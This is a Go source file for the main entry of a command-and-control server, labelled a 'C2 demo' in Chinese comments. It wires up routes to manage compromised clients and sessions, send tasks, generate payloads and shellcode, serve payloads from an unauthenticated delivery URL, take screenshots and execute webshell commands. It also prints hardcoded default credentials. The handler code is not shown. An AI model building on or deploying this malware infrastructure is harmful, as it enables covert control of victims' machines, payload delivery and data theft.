package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// ============ C2 服务端主入口（Go 版，替代 Flask app.py）============

func main() {
	// 确定目录
	exePath, _ := os.Executable()
	serverDir = filepath.Dir(exePath)
	// 如果是 go run，exePath 可能在临时目录，回退到工作目录
	if !fileExists(filepath.Join(serverDir, "static")) {
		if wd, err := os.Getwd(); err == nil {
			if fileExists(filepath.Join(wd, "static")) {
				serverDir = wd
			} else if fileExists(filepath.Join(wd, "server-go", "static")) {
				serverDir = filepath.Join(wd, "server-go")
			}
		}
	}
	projectRoot = filepath.Dir(serverDir)

	// 确保必要目录存在
	ensureDirs()

	// 初始化数据库
	dbPath := filepath.Join(serverDir, "c2.db")
	if err := initDB(dbPath); err != nil {
		log.Fatalf("数据库初始化失败: %v", err)
	}

	// 写入默认配置
	ensureDefaultSettings()

	// 加载 config.json（web ip/port/protocol 等文件配置）
	if cfg, err := loadFileConfig(); err != nil {
		log.Printf("[WARN] config.json 加载失败: %v（使用默认值）", err)
	} else {
		log.Printf("[OK] config.json 已加载: web=%s:%d (%s)", cfg.Web.Host, cfg.Web.Port, strings.ToUpper(cfg.Web.Protocol))
	}

	// 加载加密配置
	encAlgo, encPwd := loadEncryptionConfig()

	// 启动离线检测
	startOfflineChecker()

	// 注册路由
	mux := registerRoutes()

	// 获取监听配置
	listenHost := getListenHost()
	listenPort := getListenPort()
	listenProto := getListenProtocol()

	// 显示启动信息
	fmt.Println(strings.Repeat("=", 50))
	fmt.Println("C2 演示系统启动成功！ (Go 版)")
	fmt.Printf("访问地址: %s://%s:%s\n", listenProto, getEffectiveHost(), listenPort)
	fmt.Printf("监听协议: %s\n", strings.ToUpper(listenProto))
	if encAlgo != "none" {
		fmt.Printf("通信加密: %s\n", strings.ToUpper(encAlgo))
	} else {
		fmt.Println("通信加密: 未启用（明文）")
	}
	fmt.Printf("客户端监听端口: %s\n", getClientListenPort())
	fmt.Printf("内网穿透端口: 转发=%s / SOCKS5=%s / HTTP=%s\n",
		getTunnelPort("forward"), getTunnelPort("socks5"), getTunnelPort("http"))
	fmt.Printf("WebSocket 连接: /ws (原生 WebSocket，替代 Socket.IO)\n")
	fmt.Printf("Go Agent: %s/client-go/c2_agent.exe\n", projectRoot)
	fmt.Println("默认账号: admin / admin123")
	fmt.Printf("加密密码: %s\n", encPwd)
	fmt.Println(strings.Repeat("=", 50))

	addr := listenHost + ":" + listenPort
	if listenProto == "https" {
		cert := getSSLCert()
		key := getSSLKey()
		if cert != "" && key != "" {
			log.Printf("HTTPS 服务启动于 %s", addr)
			log.Fatal(http.ListenAndServeTLS(addr, cert, key, mux))
		}
		log.Printf("SSL 证书未配置，回退到 HTTP")
	}
	log.Printf("HTTP 服务启动于 %s", addr)
	log.Fatal(http.ListenAndServe(addr, mux))
}

// registerRoutes 注册所有 HTTP 路由（与 app.py 53 个路由对齐）
func registerRoutes() *http.ServeMux {
	mux := http.NewServeMux()

	// ============ 静态文件服务 ============
	// 首页
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/" {
			http.ServeFile(w, r, filepath.Join(serverDir, "static", "index.html"))
			return
		}
		// 其他静态文件
		filePath := filepath.Join(serverDir, "static", r.URL.Path)
		if fileExists(filePath) {
			http.ServeFile(w, r, filePath)
		} else {
			// SPA 回退到 index.html（非 /api/ 和 /agent/ 路径）
			if !strings.HasPrefix(r.URL.Path, "/api/") && !strings.HasPrefix(r.URL.Path, "/agent/") {
				http.ServeFile(w, r, filepath.Join(serverDir, "static", "index.html"))
				return
			}
			http.NotFound(w, r)
		}
	})

	// ============ WebSocket ============
	mux.HandleFunc("/ws", handleWebSocket)

	// ============ 认证 API ============
	mux.HandleFunc("/api/login", handleLogin)

	// ============ 仪表盘 ============
	mux.HandleFunc("/api/dashboard/stats", requireAuth(handleDashboardStats))

	// ============ 客户端管理 ============
	mux.HandleFunc("/api/clients", requireAuth(handleListClients))
	mux.HandleFunc("/api/clients/", func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path
		if strings.HasSuffix(path, "/delete") && r.Method == "POST" {
			// /api/clients/<client_id>/delete
			clientID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/clients/"), "/delete")
			r.SetPathValue("client_id", clientID)
			requireAuth(handleDeleteClient)(w, r)
			return
		}
		// /api/clients/<client_id>
		clientID := strings.TrimPrefix(path, "/api/clients/")
		r.SetPathValue("client_id", clientID)
		requireAuth(handleGetClient)(w, r)
	})

	// ============ Session 管理 ============
	mux.HandleFunc("/api/sessions", requireAuth(handleListSessions))
	mux.HandleFunc("/api/sessions/batch_kill", requireAuth(handleBatchKillSessions))
	mux.HandleFunc("/api/sessions/", func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path
		if strings.HasSuffix(path, "/kill") && r.Method == "POST" {
			sessionID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/sessions/"), "/kill")
			r.SetPathValue("session_id", sessionID)
			requireAuth(handleKillSession)(w, r)
			return
		}
		if strings.HasSuffix(path, "/interact") && r.Method == "POST" {
			sessionID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/sessions/"), "/interact")
			r.SetPathValue("session_id", sessionID)
			requireAuth(handleInteractSession)(w, r)
			return
		}
		http.NotFound(w, r)
	})

	// ============ 分组 ============
	mux.HandleFunc("/api/groups", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			requireAuth(handleCreateGroup)(w, r)
			return
		}
		requireAuth(handleListGroups)(w, r)
	})
	mux.HandleFunc("/api/clients/group", requireAuth(handleSetClientGroup))

	// ============ 任务管理 ============
	mux.HandleFunc("/api/task/send", requireAuth(handleSendTask))
	mux.HandleFunc("/api/tasks", requireAuth(handleListTasks))
	mux.HandleFunc("/api/task/", func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path
		if strings.HasSuffix(path, "/delete") && r.Method == "POST" {
			taskID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/task/"), "/delete")
			r.SetPathValue("task_id", taskID)
			requireAuth(handleDeleteTask)(w, r)
			return
		}
		// /api/task/<int:task_id>
		taskID := strings.TrimPrefix(path, "/api/task/")
		if _, err := strconv.Atoi(taskID); err != nil {
			http.NotFound(w, r)
			return
		}
		r.SetPathValue("task_id", taskID)
		requireAuth(handleGetTask)(w, r)
	})

	// ============ 日志 ============
	mux.HandleFunc("/api/logs", requireAuth(handleListLogs))
	mux.HandleFunc("/api/logs/export", requireAuth(handleExportLogs))
	mux.HandleFunc("/api/logs/clear", requireAuth(handleClearLogs))
	mux.HandleFunc("/api/media/clear", requireAuth(handleClearMedia))

	// ============ 配置管理 ============
	mux.HandleFunc("/api/settings", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "PUT" {
			requireAuth(handleUpdateSettings)(w, r)
			return
		}
		requireAuth(handleGetSettings)(w, r)
	})
	mux.HandleFunc("/api/settings/test", requireAuth(handleSettingsTest))
	mux.HandleFunc("/api/settings/reload_config", requireAuth(handleReloadConfig))
	mux.HandleFunc("/api/user/password", requireAuth(handleChangePassword))

	// ============ 用户管理 ============
	mux.HandleFunc("/api/users", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			requireAuth(handleCreateUser)(w, r)
			return
		}
		requireAuth(handleListUsers)(w, r)
	})
	mux.HandleFunc("/api/users/", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "DELETE" {
			uid := strings.TrimPrefix(r.URL.Path, "/api/users/")
			r.SetPathValue("uid", uid)
			requireAuth(handleDeleteUser)(w, r)
			return
		}
		http.NotFound(w, r)
	})

	// ============ Webhook ============
	mux.HandleFunc("/api/settings/webhook", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			requireAuth(handleSetWebhook)(w, r)
			return
		}
		requireAuth(handleGetWebhook)(w, r)
	})
	mux.HandleFunc("/api/settings/webhook/test", requireAuth(handleTestWebhook))

	// ============ Payload 管理 ============
	mux.HandleFunc("/api/payloads", requireAuth(handleListPayloads))
	mux.HandleFunc("/api/payloads/clear", requireAuth(handleClearPayloads))
	mux.HandleFunc("/api/payloads/", func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, "/delete") && r.Method == "POST" {
			pid := strings.TrimSuffix(strings.TrimPrefix(r.URL.Path, "/api/payloads/"), "/delete")
			r.SetPathValue("pid", pid)
			requireAuth(handleDeletePayload)(w, r)
			return
		}
		http.NotFound(w, r)
	})
	mux.HandleFunc("/api/payload/generate", requireAuth(handleGeneratePayload))
	mux.HandleFunc("/api/payload/shellcode/generate", requireAuth(handleGenerateShellcode))
	mux.HandleFunc("/api/payload/icon/upload", requireAuth(handlePayloadIconUpload))
	mux.HandleFunc("/api/payload/download/", requireAuth(handlePayloadDownload))
	mux.HandleFunc("/api/cmdgen/templates", requireAuth(handleCommandTemplates))

	// ============ 投递 URL（无需认证，与 app.py /deliver/<token> 对齐）============
	mux.HandleFunc("/deliver/", handleDeliver)

	// ============ 资源文件 ============
	mux.HandleFunc("/api/resource/", requireAuth(handleResource))

	// ============ 文件上传 ============
	mux.HandleFunc("/api/file/upload", requireAuth(handleFileUpload))
	mux.HandleFunc("/api/files/upload", requireAuth(handleFileUpload))

	// ============ 截图 ============
	mux.HandleFunc("/api/screenshot/", func(w http.ResponseWriter, r *http.Request) {
		clientID := strings.TrimPrefix(r.URL.Path, "/api/screenshot/")
		r.SetPathValue("client_id", clientID)
		requireAuth(handleScreenshot)(w, r)
	})

	// ============ WebShell 管理 ============
	mux.HandleFunc("/api/webshell/add", requireAuth(handleWebshellAdd))
	mux.HandleFunc("/api/webshell/list", requireAuth(handleWebshellList))
	mux.HandleFunc("/api/webshell/", func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path
		if strings.HasSuffix(path, "/edit") && r.Method == "POST" {
			clientID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/webshell/"), "/edit")
			r.SetPathValue("client_id", clientID)
			requireAuth(handleWebshellEdit)(w, r)
			return
		}
		if strings.HasSuffix(path, "/exec") && r.Method == "POST" {
			clientID := strings.TrimSuffix(strings.TrimPrefix(path, "/api/webshell/"), "/exec")
			r.SetPathValue("client_id", clientID)
			requireAuth(handleWebshellExec)(w, r)
			return
		}
		http.NotFound(w, r)
	})

	// ============ Agent 通信端点 ============
	mux.HandleFunc("/agent/heartbeat", handleAgentHeartbeat)
	mux.HandleFunc("/agent/pull", handleAgentPull)
	mux.HandleFunc("/agent/result", handleAgentResult)
	mux.HandleFunc("/agent/upload", func(w http.ResponseWriter, r *http.Request) {
		// 简化的 agent 上传接口
		jsonOK(w, map[string]interface{}{"status": "ok"})
	})

	return mux
}
